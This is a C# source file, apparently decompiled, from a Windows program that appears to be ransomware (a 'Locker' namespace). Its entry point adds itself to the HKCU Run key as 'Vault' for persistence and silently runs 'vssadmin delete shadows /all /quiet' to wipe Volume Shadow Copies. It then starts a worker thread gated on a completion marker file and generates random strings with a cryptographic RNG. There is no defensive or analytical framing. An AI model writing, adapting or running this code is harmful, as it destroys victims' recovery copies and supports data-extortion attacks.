using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Threading;
using System.Windows.Forms;
using Locker;
using Microsoft.Win32;

internal static class Class6
{
	private static string string_0 = "9617c104-8052-4ded-ab6a-094f91c693d7";

	public static readonly string string_1 = "Sonar upload";

	public static string string_2 = Path.Combine(Path.GetDirectoryName(Assembly.GetEntryAssembly()!.Location), "edone");

	private static Class0 class0_0;

	[STAThread]
	private static void Main()
	{
		smethod_1();
		smethod_2();
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		Mutex mutex = new Mutex(initiallyOwned: false, string_0);
		if (!mutex.WaitOne(0, exitContext: false))
		{
			Environment.Exit(0);
		}
		Process currentProcess = Process.GetCurrentProcess();
		Process[] processesByName = Process.GetProcessesByName(currentProcess.ProcessName);
		foreach (Process process in processesByName)
		{
			if (process.Id != currentProcess.Id)
			{
				return;
			}
		}
		if (!File.Exists(string_2))
		{
			class0_0 = new Class0();
			Thread thread = new Thread(class0_0.method_0);
			thread.Start();
		}
		Application.Run((Form)(object)new frmMain());
	}

	public static string smethod_0(int int_0)
	{
		char[] array = new char[64]
		{
			'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J',
			'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T',
			'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd',
			'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
			'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x',
			'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7',
			'8', '9', '-', '_'
		};
		char[] array2 = new char[int_0];
		byte[] array3 = new byte[int_0];
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		rNGCryptoServiceProvider.GetBytes(array3);
		for (int i = 0; i < array2.Length; i++)
		{
			int num = (int)array3[i] % array.Length;
			array2[i] = array[num];
		}
		return new string(array2);
	}

	public static void smethod_1()
	{
		try
		{
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Vault", "\"" + Assembly.GetEntryAssembly()!.Location + "\"");
		}
		catch (Exception)
		{
		}
	}

	public static void smethod_2()
	{
		try
		{
			new Process();
			Process process = new Process();
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.FileName = "vssadmin.exe";
			process.StartInfo.Arguments = "delete shadows /all /quiet";
			process.Start();
		}
		catch (Exception)
		{
		}
	}

	public static void smethod_3()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.DeleteValue("Vault");
			registryKey.Close();
		}
		catch (Exception)
		{
		}
	}
}
